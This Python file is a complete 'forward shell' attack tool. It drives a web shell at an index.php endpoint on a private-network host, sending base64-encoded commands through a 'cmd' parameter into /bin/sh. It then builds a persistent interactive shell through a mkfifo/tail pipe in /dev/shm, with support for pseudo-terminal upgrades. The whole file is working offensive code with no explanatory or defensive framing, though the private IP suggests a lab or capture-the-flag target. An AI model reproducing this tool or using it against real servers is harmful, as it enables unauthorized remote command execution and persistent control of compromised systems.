from termcolor import colored
from random import randrange
import requests
import base64
import time


class ForwardShell():

    def __init__(self):
        session = randrange(1000, 9999)
        self.main_url = "http://192.168.131.102/index.php"
        self.stdin = f"/dev/shm/{session}.input"
        self.stdout = f"/dev/shm/{session}.output"
        self.is_pseudo_terminal = False

    def remove_data(self) -> None:
        remove_data_command = f"/bin/rm {self.stdout} {self.stdout}"
        self.run_command(remove_data_command)

    def run_command(self, command: str) -> str:
        command = base64.b64encode(command.encode()).decode()
        data = {"cmd": 'echo "%s" | base64 -d | /bin/sh' % command}

        try:
            r = requests.get(self.main_url, params=data, timeout=3)
            return r.text
        except:
            pass

        return None

    def write_stdin(self, command: str) -> None:
        command = base64.b64encode(command.encode()).decode()
        data = {"cmd": f'echo "%s" | base64 -d > %s' % (command, self.stdin)}
        requests.get(self.main_url, params=data, timeout=3)

    def clear_stdout(self):
        command = f"echo '' > {self.stdout}"
        out = self.run_command(command)
        return out

    def read_stdout(self) -> str:
        for _ in range(5):
            command = f"/bin/cat {self.stdout}"
            out = self.run_command(command)
            time.sleep(0.1)

        return out

    def setup_shell(self) -> None:
        command = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.run_command(command)

    def forward_shell(self) -> None:
        while True:
            command = input(colored("> ", "yellow"))

            if "script /dev/null -c bash" in command:
                print(colored("\n[*>] Started a pseudo-terminal...\n", "cyan"))
                self.is_pseudo_terminal = True

            self.write_stdin(command + "\n")
            out_command = self.read_stdout()

            if command.strip() == "exit":
                self.is_pseudo_terminal = False
                print(colored("\n[!>] Exiting from pseudo-terminal...\n", "red"))
                self.clear_stdout()
                continue

            if self.is_pseudo_terminal:
                lines = out_command.split("\n")
                cleared_out = ""

                if len(lines) == 3:
                    cleared_out ='\n'.join([lines[-1]] + lines[:1])
                elif len(lines) > 3:
                    cleared_out ='\n'.join([lines[-1]] + lines[:1])
                    cleared_out += "\n".join(lines[2:-1])

                print(cleared_out + "\n")
            else:
                print(out_command)
            self.clear_stdout()

    def run(self) -> int:
        self.setup_shell()
        self.forward_shell()
        return 0


if __name__ == "__main__":
    forward = ForwardShell()
    forward.run()